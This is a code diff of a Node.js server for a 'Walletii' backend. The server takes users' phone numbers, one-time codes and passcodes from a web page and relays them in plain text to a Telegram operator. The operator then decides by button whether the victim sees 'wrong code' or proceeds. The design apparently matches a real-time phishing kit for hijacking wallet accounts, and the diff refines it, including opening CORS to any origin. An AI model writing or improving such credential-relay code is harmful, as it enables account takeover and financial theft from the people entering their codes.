@@ -3,7 +3,7 @@
 // ══════════════════════════════════════════════════════
 //  server.js — Walletii Backend
 //  Routes:
-//    GET  /          ← serves index.html
+//    GET  /         ← serves index.html
 //    POST /notify   ← called by the HTML app (login or OTP event)
 //    POST /poll     ← called by the HTML app every 2s to check admin decision
 //    POST /webhook  ← called by Telegram when admin clicks a button
@@ -11,13 +11,13 @@
 //    GET  /health   ← Render health check
 // ══════════════════════════════════════════════════════
 
-import express            from 'express';
-import cors               from 'cors';
-import crypto             from 'crypto';
-import { fileURLToPath }  from 'url';
-import path               from 'path';
-import config             from './config.js';
-import { setResult, popResult } from './store.js';
+import express           from 'express';
+import cors              from 'cors';
+import crypto            from 'crypto';
+import { fileURLToPath } from 'url';
+import path              from 'path';
+import config            from './config.js';
+import { setResult, popResult, setSession, getSession } from './store.js';
 import { sendAdminMessage, editMessage, answerCallback, registerWebhook, escMd } from './telegram.js';
 
 const app       = express();
@@ -26,8 +26,8 @@ const __dirname = path.dirname(fileURLToPath(import.meta.url));
 // ── Middleware ──
 app.use(express.json());
 app.use(cors({
-  origin:      config.appUrl,
-  methods:     ['GET', 'POST', 'OPTIONS'],
+  origin:         true, // reflects request origin — works for all cases
+  methods:        ['GET', 'POST', 'OPTIONS'],
   allowedHeaders: ['Content-Type'],
 }));
 
@@ -37,7 +37,6 @@ app.get('/', (_req, res) => res.sendFile(path.join(__dirname, 'index.html')));
 
 // ════════════════════════════════════════════════════════
 //  GET /health
-//  Render pings this to keep the service alive.
 // ════════════════════════════════════════════════════════
 app.get('/health', (_req, res) => {
   res.json({ ok: true, service: 'walletii-backend', ts: new Date().toISOString() });
@@ -45,8 +44,7 @@ app.get('/health', (_req, res) => {
 
 // ════════════════════════════════════════════════════════
 //  GET /setup
-//  Visit this URL once after deploying to register the webhook.
-//  e.g. https://walletii-backend.onrender.com/setup
+//  Visit once after deploying to register the Telegram webhook.
 // ════════════════════════════════════════════════════════
 app.get('/setup', async (_req, res) => {
   try {
@@ -68,18 +66,6 @@ app.get('/setup', async (_req, res) => {
 
 // ════════════════════════════════════════════════════════
 //  POST /notify
-//  Called by the HTML app with two event types:
-//
-//  type = 'login'
-//    body: { type, phone, countryCode }
-//    → sends Telegram message with [✅ Send OTP] button
-//
-//  type = 'otp'
-//    body: { type, phone, countryCode, otp, passcode }
-//    → sends Telegram message with [✅ Continue] [❌ Wrong Code] buttons
-//
-//  Returns: { ok: true, token: "..." }
-//  The app stores this token and polls /poll with it.
 // ════════════════════════════════════════════════════════
 app.post('/notify', async (req, res) => {
   const { type, phone, countryCode, otp, passcode } = req.body;
@@ -88,12 +74,17 @@ app.post('/notify', async (req, res) => {
     return res.status(400).json({ ok: false, error: 'Missing required fields' });
   }
 
-  // ── Generate a signed session token ──
-  const token = crypto.randomBytes(16).toString('hex');
+  // ── Generate a short token + HMAC sig ──
+  const token = crypto.randomBytes(8).toString('hex'); // 16 chars — keeps callback_data short
   const sig   = crypto.createHmac('sha256', config.secretKey)
                       .update(`${token}|${phone}`)
                       .digest('hex');
-  const cbData = (action) => `${action}|${token}|${sig}|${phone}`;
+
+  // ── Store session server-side so webhook can verify without stuffing it in button data ──
+  setSession(token, phone, sig, config.tokenTtl);
+
+  // ── callback_data = "action|token" — well under Telegram's 64-byte limit ──
+  const cbData = (action) => `${action}|${token}`;
 
   const fullPhone = `${countryCode || ''} ${phone}`.trim();
 
@@ -101,7 +92,6 @@ app.post('/notify', async (req, res) => {
     let text, keyboard;
 
     if (type === 'login') {
-      // ── LOGIN ATTEMPT ──
       text = `🔔 *New Login Attempt*\n\n`
            + `📱 *Phone:* \`${escMd(fullPhone)}\`\n\n`
            + `User is waiting on the OTP screen\\.`;
@@ -113,7 +103,6 @@ app.post('/notify', async (req, res) => {
     } else if (type === 'otp') {
       if (!otp) return res.status(400).json({ ok: false, error: 'Missing OTP' });
 
-      // ── OTP SUBMITTED ──
       text = `🔐 *OTP Submitted*\n\n`
            + `📱 *Phone:* \`${escMd(fullPhone)}\`\n`
            + `🔑 *OTP:* \`${escMd(otp)}\`\n`
@@ -121,8 +110,8 @@ app.post('/notify', async (req, res) => {
            + `\nChoose an action:`;
 
       keyboard = [[
-        { text: '✅ Continue',    callback_data: cbData('otp_ok')    },
-        { text: '❌ Wrong Code',  callback_data: cbData('otp_wrong') },
+        { text: '✅ Continue',   callback_data: cbData('otp_ok')    },
+        { text: '❌ Wrong Code', callback_data: cbData('otp_wrong') },
       ]];
 
     } else {
@@ -136,7 +125,6 @@ app.post('/notify', async (req, res) => {
       return res.status(500).json({ ok: false, error: 'Telegram error', detail: tgResult.description });
     }
 
-    // Return the token so the app can poll for the result
     res.json({ ok: true, token });
 
   } catch (err) {
@@ -147,27 +135,17 @@ app.post('/notify', async (req, res) => {
 
 // ════════════════════════════════════════════════════════
 //  POST /poll
-//  Called by the HTML app every 2 seconds.
-//  body: { token: "..." }
-//
-//  Returns:
-//    { ok: true, result: 'pending' }      — admin hasn't clicked yet
-//    { ok: true, result: 'otp_allowed' }  — admin clicked Send OTP
-//    { ok: true, result: 'otp_correct' }  — admin clicked Continue
-//    { ok: true, result: 'otp_wrong' }    — admin clicked Wrong Code
-//    { ok: true, result: 'expired' }      — token not found / timed out
 // ════════════════════════════════════════════════════════
 app.post('/poll', (req, res) => {
   const { token } = req.body;
 
-  if (!token || !/^[a-f0-9]{32}$/.test(token)) {
+  if (!token || !/^[a-f0-9]{16}$/.test(token)) {
     return res.status(400).json({ ok: false, error: 'Invalid token' });
   }
 
   const result = popResult(token);
 
   if (result === null) {
-    // Not stored yet — tell the app to keep polling
     return res.json({ ok: true, result: 'pending' });
   }
 
@@ -179,8 +157,7 @@ app.post('/poll', (req, res) => {
 //  Telegram calls this when the admin clicks a button.
 // ════════════════════════════════════════════════════════
 app.post('/webhook', async (req, res) => {
-  // Always respond 200 immediately so Telegram doesn't retry
-  res.json({ ok: true });
+  res.json({ ok: true }); // respond immediately so Telegram doesn't retry
 
   const update = req.body;
   if (!update?.callback_query) return;
@@ -197,21 +174,27 @@ app.post('/webhook', async (req, res) => {
     return;
   }
 
-  // ── Parse: "action|token|sig|phone" ──
+  // ── Parse: "action|token" ──
   const parts = data.split('|');
-  if (parts.length !== 4) {
+  if (parts.length !== 2) {
     await answerCallback(cbId, '⚠️ Invalid data');
     return;
   }
 
-  const [action, token, sig, phone] = parts;
+  const [action, token] = parts;
 
-  // ── Verify HMAC signature ──
+  // ── Look up session and verify HMAC ──
+  const session = getSession(token);
+  if (!session) {
+    await answerCallback(cbId, '⚠️ Session expired or not found', true);
+    return;
+  }
+
   const expectedSig = crypto.createHmac('sha256', config.secretKey)
-                            .update(`${token}|${phone}`)
+                            .update(`${token}|${session.phone}`)
                             .digest('hex');
 
-  if (!crypto.timingSafeEqual(Buffer.from(sig), Buffer.from(expectedSig))) {
+  if (!crypto.timingSafeEqual(Buffer.from(session.sig), Buffer.from(expectedSig))) {
     await answerCallback(cbId, '⚠️ Invalid signature', true);
     return;
   }
